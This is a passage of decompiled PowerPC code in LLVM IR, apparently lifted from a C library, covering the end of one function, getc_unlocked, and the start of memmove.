  %tmp82 = icmp slt i32 %v2_100081ac, 1
  br i1 %tmp82, label %dec_label_pc_10008218, label %dec_label_pc_100081bc

dec_label_pc_100081bc:                            ; preds = %dec_label_pc_10008190
  %v3_100081bc = load i32, i32* %v2_10007bf8, align 4
  store i32 %v3_100081bc, i32* %r0.global-to-local, align 4
  %v1_100081c0 = and i32 %v3_100081bc, 8
  store i32 %v1_100081c0, i32* @r7, align 4
  %v3_100081c0 = icmp eq i32 %v1_100081c0, 0
  br i1 %v3_100081c0, label %dec_label_pc_100081e4, label %dec_label_pc_100081c8

dec_label_pc_100081c8:                            ; preds = %dec_label_pc_100081bc
  %v1_100081cc = add i32 %v0_100081f4, 12
  store i32 %v1_100081cc, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_1000cf53.433 to i32), i32* %r9.global-to-local, align 4
  %v2_100081d4 = inttoptr i32 %v0_100081f4 to i32*
  store i32 160, i32* %v2_100081d4, align 4
  %v0_100081d8 = load i32, i32* %r11.global-to-local, align 4
  %v1_100081d8 = load i32, i32* %r8.global-to-local, align 4
  %v2_100081d8 = add i32 %v1_100081d8, 4
  %v3_100081d8 = inttoptr i32 %v2_100081d8 to i32*
  store i32 %v0_100081d8, i32* %v3_100081d8, align 4
  %v0_100081dc = load i32, i32* %r9.global-to-local, align 4
  %v1_100081dc = load i32, i32* %r8.global-to-local, align 4
  %v2_100081dc = add i32 %v1_100081dc, 8
  %v3_100081dc = inttoptr i32 %v2_100081dc to i32*
  store i32 %v0_100081dc, i32* %v3_100081dc, align 4
  br label %dec_label_pc_10008218

dec_label_pc_100081e4:                            ; preds = %dec_label_pc_100081bc
  %v1_100081e4 = add i32 %tmp, 16
  %v2_100081e4 = inttoptr i32 %v1_100081e4 to i32*
  %v3_100081e4 = load i32, i32* %v2_100081e4, align 4
  store i32 %v3_100081e4, i32* %r0.global-to-local, align 4
  %v1_100081e8 = icmp slt i32 %v3_100081e4, 48
  %v3_100081e8 = icmp eq i32 %v3_100081e4, 48
  store i1 %v1_100081e8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100081e8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100081e8, label %dec_label_pc_100081f0, label %dec_label_pc_1000820c

dec_label_pc_100081f0:                            ; preds = %dec_label_pc_100081e4
  %v3_100081f0 = load i32, i32* %stack_var_-140, align 4
  store i32 %v0_100081f4, i32* @r30, align 4
  %v2_100081f8 = add i32 %v3_100081f0, %v2_100081ac
  store i32 %v2_100081f8, i32* %r0.global-to-local, align 4
  store i32 %v2_100081f8, i32* %stack_var_-140, align 4
  br label %dec_label_pc_10008218

dec_label_pc_10008204:                            ; preds = %dec_label_pc_10008220
  store i32 -1, i32* @r29, align 4
  br label %dec_label_pc_10008254

dec_label_pc_1000820c:                            ; preds = %dec_label_pc_100081e4
  store i32 %v2_10008188, i32* %r0.global-to-local, align 4
  store i32 %v0_100081f4, i32* @r30, align 4
  br label %dec_label_pc_10008218

dec_label_pc_10008218:                            ; preds = %dec_label_pc_10008190, %dec_label_pc_100081f0, %dec_label_pc_100081c8, %dec_label_pc_1000820c
  store i32 0, i32* @r29, align 4
  %v2_1000821c = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_1000821c, i32* @r31, align 4
  br label %dec_label_pc_10008220

dec_label_pc_10008220:                            ; preds = %dec_label_pc_10008250, %dec_label_pc_10008218
  %v0_10008230 = phi i32 [ %v1_1000823c, %dec_label_pc_10008250 ], [ %v2_1000821c, %dec_label_pc_10008218 ]
  %v1_10008220 = inttoptr i32 %v0_10008230 to i32*
  %v2_10008220 = load i32, i32* %v1_10008220, align 4
  store i32 %v2_10008220, i32* %r4.global-to-local, align 4
  %v0_10008224 = load i32, i32* @r27, align 4
  store i32 %v0_10008224, i32* %r3.global-to-local, align 4
  %v1_10008228 = add i32 %v0_10008230, 4
  %v2_10008228 = inttoptr i32 %v1_10008228 to i32*
  %v3_10008228 = load i32, i32* %v2_10008228, align 4
  store i32 %v3_10008228, i32* %r5.global-to-local, align 4
  %v0_1000822c = load i32, i32* @r26, align 4
  store i32 %v0_1000822c, i32* %ctr.global-to-local, align 4
  %v1_10008230 = add i32 %v0_10008230, 8
  %v2_10008230 = inttoptr i32 %v1_10008230 to i32*
  %v3_10008230 = load i32, i32* %v2_10008230, align 4
  store i32 %v3_10008230, i32* %r6.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_1000822c)
  %v0_10008238 = load i32, i32* @r31, align 4
  %v1_10008238 = add i32 %v0_10008238, 4
  %v2_10008238 = inttoptr i32 %v1_10008238 to i32*
  %v3_10008238 = load i32, i32* %v2_10008238, align 4
  store i32 %v3_10008238, i32* %r0.global-to-local, align 4
  %v1_1000823c = add i32 %v0_10008238, 12
  store i32 %v1_1000823c, i32* @r31, align 4
  %v0_10008240 = load i32, i32* @r29, align 4
  %v1_10008240 = load i32, i32* %r3.global-to-local, align 4
  %v2_10008240 = add i32 %v1_10008240, %v0_10008240
  store i32 %v2_10008240, i32* @r29, align 4
  %v1_10008244 = load i32, i32* @r30, align 4
  %v2_10008244 = icmp ult i32 %v1_1000823c, %v1_10008244
  %v3_10008244 = icmp ugt i32 %v1_1000823c, %v1_10008244
  %v4_10008244 = icmp eq i32 %v1_1000823c, %v1_10008244
  store i1 %v2_10008244, i1* %cr6_lt.global-to-local, align 1
  store i1 %v3_10008244, i1* %cr6_gt.global-to-local, align 1
  store i1 %v4_10008244, i1* %cr6_eq.global-to-local, align 1
  %v2_10008248 = icmp slt i32 %v1_10008240, %v3_10008238
  %v4_10008248 = icmp eq i32 %v1_10008240, %v3_10008238
  store i1 %v2_10008248, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10008248, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10008248, label %dec_label_pc_10008250, label %dec_label_pc_10008204

dec_label_pc_10008250:                            ; preds = %dec_label_pc_10008220
  br i1 %v2_10008244, label %dec_label_pc_10008220, label %dec_label_pc_10008254

dec_label_pc_10008254:                            ; preds = %dec_label_pc_10008250, %dec_label_pc_10008204
  %v0_10008258 = phi i32 [ -1, %dec_label_pc_10008204 ], [ %v2_10008240, %dec_label_pc_10008250 ]
  store i32 %v0_10007bac, i32* %r0.global-to-local, align 4
  store i32 %v0_10008258, i32* %r3.global-to-local, align 4
  ret i32 %v0_10008258

; uselistorder directives
  uselistorder i32 %v0_10008258, { 1, 0 }
  uselistorder i32 %v1_10008240, { 2, 1, 0 }
  uselistorder i32 %v1_1000823c, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v3_10008238, { 1, 0, 2 }
  uselistorder i32 %v0_10008230, { 0, 2, 1 }
  uselistorder i32 %v3_100081e4, { 1, 0, 2 }
  uselistorder i32 %v1_100081a4, { 1, 0 }
  uselistorder i32 %v2_10008188, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10008180, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000817c, { 1, 0 }
  uselistorder i32 %v0_100081f4, { 3, 2, 5, 4, 6, 1, 0 }
  uselistorder i32 %v3_10008148, { 1, 2, 0 }
  uselistorder i32 %v1_1000812c, { 1, 0, 2 }
  uselistorder i32 %v2_10008128, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_100080f8, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v1_100080c8, { 2, 0, 1 }
  uselistorder i32 %v2_100080c4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_10008034, { 1, 0 }
  uselistorder i32 %v2_10007f9c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_10007f6c, { 4, 0, 3, 2, 1 }
  uselistorder i32 %v1_10007f34, { 3, 0, 1, 2 }
  uselistorder i32 %v0_10007f2c, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32 %v2_10007ef8, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32 %v0_10007ee8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_10007edc, { 1, 0, 2 }
  uselistorder i32 %v1_10007ec0, { 0, 3, 2, 1 }
  uselistorder i32 %v2_10007e78, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_10007e68, { 1, 0, 3, 2 }
  uselistorder i32 %v1_10007e4c, { 1, 0 }
  uselistorder i32 %v1_10007e28, { 1, 0 }
  uselistorder i32 %v2_10007e08, { 1, 0, 2 }
  uselistorder i32 %v0_10007db0, { 1, 0 }
  uselistorder i32 %v1_10007c14, { 1, 0 }
  uselistorder i32 %v0_10007ca4, { 2, 1, 0 }
  uselistorder i32 %v1_10007be8, { 1, 0 }
  uselistorder i32 %v1_10007bd0, { 1, 0, 2 }
  uselistorder i32* %stack_var_-132, { 1, 0, 2 }
  uselistorder i32* %stack_var_-177, { 1, 2, 0 }
  uselistorder i32* %stack_var_-120, { 1, 0, 2 }
  uselistorder i32* %stack_var_-140, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-200, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 1, 2, 0, 5, 6 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20, 18, 21, 22, 19, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32* %r8.global-to-local, { 31, 32, 0, 8, 9, 10, 11, 1, 12, 13, 14, 2, 15, 16, 17, 3, 18, 19, 20, 4, 21, 22, 23, 5, 6, 7, 24, 26, 25, 27, 28, 29, 30, 33 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 8, 9, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 4, 7, 5, 8, 6, 9, 10, 11, 0 }
  uselistorder i32* %r31.global-to-local, { 2, 3, 4, 5, 0, 6, 1, 7 }
  uselistorder i32* %r30.global-to-local, { 4, 5, 0, 6, 1, 7, 3, 2, 8 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 8, 9, 10, 14, 15, 16, 19, 17, 20, 18, 21, 22, 23, 24 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 10, 8, 11, 14, 12, 13, 15, 16, 17, 19, 18 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 19, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0, 37, 38, 39, 40 }
  uselistorder i1* %cr7_lt.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i1* %cr7_eq.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31 }
  uselistorder i1* %cr6_gt.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 160, { 0, 3, 4, 2, 1 }
  uselistorder i32 112, { 2, 3, 0, 1, 4 }
  uselistorder i32 176, { 1, 2, 0, 3 }
  uselistorder i8 48, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 -2147483648, { 9, 0, 1, 11, 10, 2, 4, 3, 12, 6, 5, 13, 8, 7, 14 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1000cf50.431 to i32), { 2, 0, 1 }
  uselistorder i32 43, { 1, 0 }
  uselistorder label %dec_label_pc_10008218, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10008178, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008128.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10008114, { 1, 0 }
  uselistorder label %dec_label_pc_100080f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100080c4, { 1, 0 }
  uselistorder label %dec_label_pc_100080b0, { 1, 0 }
  uselistorder label %dec_label_pc_10008094, { 1, 0 }
  uselistorder label %dec_label_pc_1000806c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000804c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008028, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000800c, { 1, 0 }
  uselistorder label %dec_label_pc_10007f7c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10007f18, { 1, 0 }
  uselistorder label %dec_label_pc_10007ed8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10007e9c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10007e70, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10007e50, { 1, 0 }
  uselistorder label %dec_label_pc_10007ddc, { 1, 0 }
  uselistorder label %dec_label_pc_10007ccc, { 1, 0 }
  uselistorder label %dec_label_pc_10007c24, { 1, 0 }
  uselistorder label %dec_label_pc_10007bf8, { 1, 0 }
  uselistorder label %dec_label_pc_10007bec, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i8, align 1
  %v0_10008270 = load i32, i32* @lr, align 4
  store i32 %v0_10008270, i32* %r0.global-to-local, align 4
  %v0_10008274 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_10008280 = add i32 %tmp, 16
  %v3_10008280 = inttoptr i32 %v2_10008280 to i32*
  %v4_10008280 = load i32, i32* %v3_10008280, align 4
  store i32 %v4_10008280, i32* %r9.global-to-local, align 4
  %v2_10008284 = add i32 %tmp, 24
  %v3_10008284 = inttoptr i32 %v2_10008284 to i32*
  %v4_10008284 = load i32, i32* %v3_10008284, align 4
  store i32 %v4_10008284, i32* %r0.global-to-local, align 4
  %v2_10008288 = icmp ult i32 %v4_10008280, %v4_10008284
  br i1 %v2_10008288, label %dec_label_pc_100082f0, label %dec_label_pc_10008290

dec_label_pc_10008290:                            ; preds = %entry
  %v3_10008290 = load i16, i16* %arg1, align 2
  %v4_10008290 = zext i16 %v3_10008290 to i32
  %v1_10008294 = and i32 %v4_10008290, 131
  store i32 %v1_10008294, i32* %r0.global-to-local, align 4
  %v2_10008298 = icmp ugt i32 %v1_10008294, 128
  br i1 %v2_10008298, label %dec_label_pc_100082b0, label %dec_label_pc_100082a0

dec_label_pc_100082a0:                            ; preds = %dec_label_pc_10008290
  store i32 268468904, i32* @lr, align 4
  %v3_100082a4 = call i32 @__stdio_trans2r_o(i16* inttoptr (i32 128 to i16*), i32 %v4_10008280)
  store i32 %v3_100082a4, i32* %r3.global-to-local, align 4
  %v3_100082a8 = icmp eq i32 %v3_100082a4, 0
  br i1 %v3_100082a8, label %dec_label_pc_100082a0.dec_label_pc_100082b0_crit_edge, label %dec_label_pc_1000838c

dec_label_pc_100082a0.dec_label_pc_100082b0_crit_edge: ; preds = %dec_label_pc_100082a0
  %v0_100082b0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100082b0

dec_label_pc_100082b0:                            ; preds = %dec_label_pc_100082a0.dec_label_pc_100082b0_crit_edge, %dec_label_pc_10008290
  %v2_10008310 = phi i32 [ %v0_100082b0.pre, %dec_label_pc_100082a0.dec_label_pc_100082b0_crit_edge ], [ %tmp, %dec_label_pc_10008290 ]
  %v1_100082b0 = inttoptr i32 %v2_10008310 to i16*
  %v2_100082b0 = load i16, i16* %v1_100082b0, align 2
  %v3_100082b0 = zext i16 %v2_100082b0 to i32
  %v1_100082b4 = and i32 %v3_100082b0, 2
  store i32 %v1_100082b4, i32* %r0.global-to-local, align 4
  %v3_100082b4 = icmp eq i32 %v1_100082b4, 0
  br i1 %v3_100082b4, label %dec_label_pc_100082e0, label %dec_label_pc_100082bc

dec_label_pc_100082bc:                            ; preds = %dec_label_pc_100082b0
  %v1_100082bc = call i32 @__asm_rlwinm(i32 %v3_100082b0, i32 2, i32 29, i32 29)
  %v1_100082c0 = load i32, i32* @r31, align 4
  %v2_100082c0 = add i32 %v1_100082c0, %v1_100082bc
  store i32 %v2_100082c0, i32* %r9.global-to-local, align 4
  %v1_100082c4 = add i32 %v2_100082c0, 39
  %v2_100082c4 = inttoptr i32 %v1_100082c4 to i8*
  %v3_100082c4 = load i8, i8* %v2_100082c4, align 1
  %v4_100082c4 = zext i8 %v3_100082c4 to i32
  store i32 %v4_100082c4, i32* %r0.global-to-local, align 4
  %v1_100082c8 = add nsw i32 %v3_100082b0, -1
  store i32 %v1_100082c8, i32* %r9.global-to-local, align 4
  %v1_100082cc = trunc i32 %v1_100082c8 to i16
  %v3_100082cc = inttoptr i32 %v1_100082c0 to i16*
  store i16 %v1_100082cc, i16* %v3_100082cc, align 2
  %v0_100082d0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_100082d0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100082d8 = load i32, i32* @r31, align 4
  %v2_100082d8 = add i32 %v1_100082d8, 40
  %v3_100082d8 = inttoptr i32 %v2_100082d8 to i32*
  store i32 0, i32* %v3_100082d8, align 4
  br label %dec_label_pc_10008390

dec_label_pc_100082e0:                            ; preds = %dec_label_pc_100082b0
  %v1_100082e0 = add i32 %v2_10008310, 16
  %v2_100082e0 = inttoptr i32 %v1_100082e0 to i32*
  %v3_100082e0 = load i32, i32* %v2_100082e0, align 4
  store i32 %v3_100082e0, i32* %r9.global-to-local, align 4
  %v1_100082e4 = add i32 %v2_10008310, 20
  %v2_100082e4 = inttoptr i32 %v1_100082e4 to i32*
  %v3_100082e4 = load i32, i32* %v2_100082e4, align 4
  store i32 %v3_100082e4, i32* %r0.global-to-local, align 4
  %v4_100082e8 = icmp eq i32 %v3_100082e4, %v3_100082e0
  br i1 %v4_100082e8, label %dec_label_pc_100082fc, label %dec_label_pc_100082f0

dec_label_pc_100082f0:                            ; preds = %dec_label_pc_100082e0, %entry
  %v1_100083647 = phi i32 [ %v2_10008310, %dec_label_pc_100082e0 ], [ %tmp, %entry ]
  %v0_100082f0 = phi i32 [ %v3_100082e0, %dec_label_pc_100082e0 ], [ %v4_10008280, %entry ]
  %v1_100082f0 = inttoptr i32 %v0_100082f0 to i8*
  %v2_100082f0 = load i8, i8* %v1_100082f0, align 1
  %v3_100082f0 = zext i8 %v2_100082f0 to i32
  store i32 %v3_100082f0, i32* %r3.global-to-local, align 4
  %v1_100082f4 = add i32 %v0_100082f0, 1
  store i32 %v1_100082f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10008364

dec_label_pc_100082fc:                            ; preds = %dec_label_pc_100082e0
  %v1_100082fc = add i32 %v2_10008310, 4
  %v2_100082fc = inttoptr i32 %v1_100082fc to i32*
  %v3_100082fc = load i32, i32* %v2_100082fc, align 4
  store i32 %v3_100082fc, i32* %r0.global-to-local, align 4
  %v3_10008300 = icmp eq i32 %v3_100082fc, -2
  br i1 %v3_10008300, label %dec_label_pc_10008308, label %dec_label_pc_10008318

dec_label_pc_10008308:                            ; preds = %dec_label_pc_100082fc
  %v1_10008308 = or i32 %v3_100082b0, 4
  store i32 %v1_10008308, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10008310 = trunc i32 %v1_10008308 to i16
  store i16 %v1_10008310, i16* %v1_100082b0, align 2
  br label %dec_label_pc_10008390

dec_label_pc_10008318:                            ; preds = %dec_label_pc_100082fc
  %v1_10008318 = and i32 %v3_100082b0, 768
  store i32 %v1_10008318, i32* %r0.global-to-local, align 4
  %v3_10008318 = icmp eq i32 %v1_10008318, 0
  br i1 %v3_10008318, label %dec_label_pc_1000832c, label %dec_label_pc_10008320

dec_label_pc_10008320:                            ; preds = %dec_label_pc_10008318
  store i32 ptrtoint (i32** @global_var_1001d804.351 to i32), i32* %r3.global-to-local, align 4
  store i32 268469036, i32* @lr, align 4
  %v4_10008328 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_1001d804.351 to i16*), i32 %v3_100082e0)
  store i32 %v4_10008328, i32* %r3.global-to-local, align 4
  %v0_1000832c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000832c

dec_label_pc_1000832c:                            ; preds = %dec_label_pc_10008318, %dec_label_pc_10008320
  %v0_1000836c = phi i32 [ %v2_10008310, %dec_label_pc_10008318 ], [ %v0_1000832c.pre, %dec_label_pc_10008320 ]
  %v1_1000832c = add i32 %v0_1000836c, 8
  %v2_1000832c = inttoptr i32 %v1_1000832c to i32*
  %v3_1000832c = load i32, i32* %v2_1000832c, align 4
  store i32 %v3_1000832c, i32* %r9.global-to-local, align 4
  %v1_10008330 = add i32 %v0_1000836c, 12
  %v2_10008330 = inttoptr i32 %v1_10008330 to i32*
  %v3_10008330 = load i32, i32* %v2_10008330, align 4
  store i32 %v3_10008330, i32* %r0.global-to-local, align 4
  %v4_10008334 = icmp eq i32 %v3_10008330, %v3_1000832c
  br i1 %v4_10008334, label %dec_label_pc_1000836c, label %dec_label_pc_1000833c

dec_label_pc_1000833c:                            ; preds = %dec_label_pc_1000832c
  %v2_1000833c = add i32 %v0_1000836c, 24
  %v3_1000833c = inttoptr i32 %v2_1000833c to i32*
  store i32 %v3_1000832c, i32* %v3_1000833c, align 4
  %v0_10008340 = load i32, i32* @r31, align 4
  store i32 %v0_10008340, i32* %r3.global-to-local, align 4
  store i32 268469064, i32* @lr, align 4
  %v3_10008344 = call i32 @__stdio_rfill(i32 %v0_10008340, i32 %v3_1000832c)
  store i32 %v3_10008344, i32* %r3.global-to-local, align 4
  %v3_10008348 = icmp eq i32 %v3_10008344, 0
  br i1 %v3_10008348, label %dec_label_pc_1000838c, label %dec_label_pc_10008350

dec_label_pc_10008350:                            ; preds = %dec_label_pc_1000833c
  %v0_10008350 = load i32, i32* @r31, align 4
  %v1_10008350 = add i32 %v0_10008350, 20
  %v2_10008350 = inttoptr i32 %v1_10008350 to i32*
  %v3_10008350 = load i32, i32* %v2_10008350, align 4
  store i32 %v3_10008350, i32* %r0.global-to-local, align 4
  %v1_10008354 = add i32 %v0_10008350, 16
  %v2_10008354 = inttoptr i32 %v1_10008354 to i32*
  %v3_10008354 = load i32, i32* %v2_10008354, align 4
  store i32 %v3_10008354, i32* %r9.global-to-local, align 4
  %v2_10008358 = add i32 %v0_10008350, 24
  %v3_10008358 = inttoptr i32 %v2_10008358 to i32*
  store i32 %v3_10008350, i32* %v3_10008358, align 4
  %v0_1000835c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000835c = add i32 %v0_1000835c, 1
  store i32 %v1_1000835c, i32* %r0.global-to-local, align 4
  %v1_10008360 = inttoptr i32 %v0_1000835c to i8*
  %v2_10008360 = load i8, i8* %v1_10008360, align 1
  %v3_10008360 = zext i8 %v2_10008360 to i32
  store i32 %v3_10008360, i32* %r3.global-to-local, align 4
  %v1_10008364.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10008364

dec_label_pc_10008364:                            ; preds = %dec_label_pc_100082f0, %dec_label_pc_10008350
  %v1_10008364 = phi i32 [ %v1_100083647, %dec_label_pc_100082f0 ], [ %v1_10008364.pre, %dec_label_pc_10008350 ]
  %v0_10008364 = phi i32 [ %v1_100082f4, %dec_label_pc_100082f0 ], [ %v1_1000835c, %dec_label_pc_10008350 ]
  %v2_10008364 = add i32 %v1_10008364, 16
  %v3_10008364 = inttoptr i32 %v2_10008364 to i32*
  store i32 %v0_10008364, i32* %v3_10008364, align 4
  br label %dec_label_pc_10008390

dec_label_pc_1000836c:                            ; preds = %dec_label_pc_1000832c
  %v1_1000836c = inttoptr i32 %v0_1000836c to i16*
  store i32 %v0_1000836c, i32* %r3.global-to-local, align 4
  %v2_10008370 = ptrtoint i8* %stack_var_-24 to i32
  store i32 268469116, i32* @lr, align 4
  %v5_10008378 = call i32 @__stdio_READ(i16* %v1_1000836c, i32 %v2_10008370, i32 1)
  store i32 %v5_10008378, i32* %r3.global-to-local, align 4
  %v3_1000837c = icmp eq i32 %v5_10008378, 0
  br i1 %v3_1000837c, label %dec_label_pc_1000838c, label %dec_label_pc_10008384

dec_label_pc_10008384:                            ; preds = %dec_label_pc_1000836c
  %v3_10008384 = load i8, i8* %stack_var_-24, align 1
  %v4_10008384 = sext i8 %v3_10008384 to i32
  store i32 %v4_10008384, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008390

dec_label_pc_1000838c:                            ; preds = %dec_label_pc_100082a0, %dec_label_pc_1000836c, %dec_label_pc_1000833c
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008390

dec_label_pc_10008390:                            ; preds = %dec_label_pc_10008384, %dec_label_pc_10008364, %dec_label_pc_10008308, %dec_label_pc_100082bc, %dec_label_pc_1000838c
  store i32 %v0_10008270, i32* %r0.global-to-local, align 4
  store i32 %v0_10008274, i32* @r31, align 4
  %v0_100083a0 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100083a0

; uselistorder directives
  uselistorder i32 %v0_1000836c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_100082f0, { 1, 0 }
  uselistorder i32 %v3_100082e0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_100082c0, { 1, 0 }
  uselistorder i32 %v3_100082b0, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v2_10008310, { 1, 2, 0, 4, 3, 5 }
  uselistorder i8* %stack_var_-24, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 12, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i16* @global_var_1001d4dc.284, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10008390, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000838c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10008364, { 1, 0 }
  uselistorder label %dec_label_pc_1000832c, { 1, 0 }
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v2_100083a4 = icmp ult i32 %arg2, %arg1
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v0_100083ac = load i32, i32* @r5, align 4
  store i32 %v0_100083ac, i32* @r11, align 4
  br i1 %v2_100083a4, label %dec_label_pc_100083b8, label %dec_label_pc_100083b4

dec_label_pc_100083b4:                            ; preds = %entry
  %v0_100083b4 = call i32 @memcpy()
  %v1_100083b8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_100083b8

dec_label_pc_100083b8:                            ; preds = %entry, %dec_label_pc_100083b4
  %v0_100083bc = phi i32 [ %arg1, %entry ], [ %v0_100083b4, %dec_label_pc_100083b4 ]
  %v1_100083b8 = phi i32 [ %v0_100083ac, %entry ], [ %v1_100083b8.pre, %dec_label_pc_100083b4 ]
  %v2_100083b8 = add i32 %v1_100083b8, %arg2
  store i32 %v2_100083b8, i32* %r4.global-to-local, align 4
  %v2_100083bc = add i32 %v1_100083b8, %v0_100083bc
  store i32 %v2_100083bc, i32* %r10.global-to-local, align 4
  %v1_100083c0 = call i32 @__asm_rlwinm.(i32 %v1_100083b8, i32 29, i32 3, i32 31)
  store i32 %v1_100083c0, i32* %r9.global-to-local, align 4
  %v4_100083c0 = icmp eq i32 %v1_100083c0, 0
  br i1 %v4_100083c0, label %dec_label_pc_100083e8, label %dec_label_pc_100083c8

dec_label_pc_100083c8:                            ; preds = %dec_label_pc_100083b8
  %v0_100083c8 = load i32, i32* %r10.global-to-local, align 4
  %v1_100083c8 = urem i32 %v0_100083c8, 4
  %v3_100083c8 = icmp eq i32 %v1_100083c8, 0
  br i1 %v3_100083c8, label %dec_label_pc_100083d0, label %dec_label_pc_1000841c

dec_label_pc_100083d0:                            ; preds = %dec_label_pc_10008434.dec_label_pc_100083d0_crit_edge, %dec_label_pc_100083c8
  %v1_100083dc.pre = phi i32 [ %v1_100083dc.pre.pre, %dec_label_pc_10008434.dec_label_pc_100083d0_crit_edge ], [ %v0_100083c8, %dec_label_pc_100083c8 ]
  %v0_100083d0 = phi i32 [ %v1_10008434, %dec_label_pc_10008434.dec_label_pc_100083d0_crit_edge ], [ %v1_100083c0, %dec_label_pc_100083c8 ]
  store i32 %v0_100083d0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100083d4

dec_label_pc_100083d4:                            ; preds = %dec_label_pc_100083d4, %dec_label_pc_100083d0
  %v1_100083dc = phi i32 [ %v2_100083e0, %dec_label_pc_100083d4 ], [ %v1_100083dc.pre, %dec_label_pc_100083d0 ]
  %v0_100083d4 = load i32, i32* %r4.global-to-local, align 4
  %v1_100083d4 = add i32 %v0_100083d4, -4
  %v2_100083d4 = inttoptr i32 %v1_100083d4 to i32*
